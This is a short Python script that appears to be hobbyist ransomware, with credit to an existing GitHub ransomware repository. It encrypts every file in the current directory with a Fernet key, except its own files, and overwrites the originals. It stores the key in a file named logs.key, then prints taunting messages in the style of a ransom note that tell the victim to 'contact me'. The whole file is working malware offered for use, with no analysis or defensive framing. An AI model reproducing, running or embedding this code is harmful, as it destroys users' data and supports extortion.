#!/usr/bin/env python3

# used code from multiple repositories and youtubers: Thanks to https://github.com/ncorbuk/Python-Ransomware
# for showing what a good malware looks like. I definatly took a lot of inspiration from this repo.

# access necessary components

# Using the OS library helps with abstraction because it helps add simplicity to
# a difficult task that would take much longer without the library.

import os
from cryptography.fernet import Fernet

# find the files to encrypt

files = []

# algorithm:

for file in os.listdir():
    if file == "encrypt.py" or file == "logs.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# generate an AES encryption key

key = Fernet.generate_key()

# add key to a file

with open("logs.key", "wb") as logs:
    logs.write(key)

# encrypt the files

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# print statements go brrr

print("Well, you ran the script. What exactly did you think would happen here?")
print("Oh you thought this file was just a joke did you?")
print("Not an actual serious piece of software that was capable of destroying your computer?")
print("Well you were wrong...")
print("Good luck trying to recover everything!")
print("Or you could just contact me...")
